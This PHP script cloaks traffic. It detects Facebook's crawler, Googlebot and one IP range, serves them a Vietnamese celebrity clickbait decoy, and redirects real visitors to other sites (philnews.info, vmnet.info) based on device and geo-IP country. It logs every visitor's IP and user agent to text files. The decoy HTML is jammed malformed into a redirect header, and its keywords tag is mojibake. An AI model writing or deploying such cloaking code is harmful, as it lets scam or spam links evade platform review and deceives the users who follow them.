
<?php
function checkIP($ip)
{
    $lowIp = ip2long('66.100.0.0');
    $highIp = ip2long('66.255.255.255');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function checkCountry($ip)
{
    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
    return json_decode($json)->country_code;
}

$country = checkCountry($_SERVER['REMOTE_ADDR']);

$allowedAgents = "allowedAgents11uNinV3oSGKLNa9Ubj5HSPu8BxLcldhOtrkceq58gEvTZyOpD7zDTofi-KXmWUaYQCA0IZstG6sj42Qf964xeIy-MghdXbRwVMl.txt";
$blockedAgents = "blockedAgents11uNinV3oSGKLNa9Ubj5HSPu8BxLcldhOtrkceq58gEvTZyOpD7zDTofi-KXmWUaYQCA0IZstG6sj42Qf964xeIy-MghdXbRwVMl.txt";

$ip = ip2long($_SERVER['REMOTE_ADDR']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' blocked ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://news.pnnews.dev/
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>HOT: Đàm Vĩnh Hưng khóc nức nở kể chuyện mẹ ruột gây ra nợ nần</title>
<meta property="fb:app_id" content="">
<meta property="article:author" content="https://www.facebook.com/4795236469298187">
<meta property="og:site_name" content="HOT: Đàm Vĩnh Hưng khóc nức nở kể chuyện mẹ ruột gây ra nợ nần">
<meta name="news_keywords" content="Bernie Sanders, Warriors, Democrats,Politics,2016 Election">
<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex,nofollow">
<meta property="og:image" content="http://imageshack.com/a/img924/2015/bsUxWv.jpg">
<meta property="image:width" content="1280">
<meta property="image:height" content="720">
<meta name="description" content="hay">
<meta name="keywords" content="ÂÃÂÂÃÂÂ¬ÃÃÂÂ©ÃÃÂÂÃÂ‹ÃÂÂÂ™ÃÂÃÃÂÂ²ÃÃ‹™¼ÃÂÃÂ¾ÃÂÂÃ¾ÂÃÂÂÂ»¼ÃÃÃ·ÃÃÂÃ½ÃÃ¯Ã¶ÃÂ³²ÂÂÂ¡ÂÃÂ¾ÂÂÃÂÂ‹ÃÃ«ÂÂÃÃÂÂÃÃ‹ÂÂ">
<meta name="fb_title" content="HOT: Đàm Vĩnh Hưng khóc nức nở kể chuyện mẹ ruột gây ra nợ nần">
<meta property="og:type" content="website">
<meta property="og:title" content="HOT: Đàm Vĩnh Hưng khóc nức nở kể chuyện mẹ ruột gây ra nợ nần">
<meta property="og:description" content="hay">
</head>
<body>  </body>
</html>
', true, 301);
    die();
} else {
    $iPod = stripos($_SERVER['HTTP_USER_AGENT'],"iPod");
    $iPhone = stripos($_SERVER['HTTP_USER_AGENT'],"iPhone");
    $iPad = stripos($_SERVER['HTTP_USER_AGENT'],"iPad");
    $Android = stripos($_SERVER['HTTP_USER_AGENT'],"Android");
    $webOS   = stripos($_SERVER['HTTP_USER_AGENT'],"webOS");
    if($iPhone && $country !== 'VN') {
      header('Location: http://philnews.info', true, 301);
      $fAgent = fopen($allowedAgents, 'a');
      $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
      fwrite($fAgent, $agent);
      fclose($fAgent);
      die();
    } else {
    $fAgent = fopen($allowedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://vmnet.info', true, 301);
    }
}

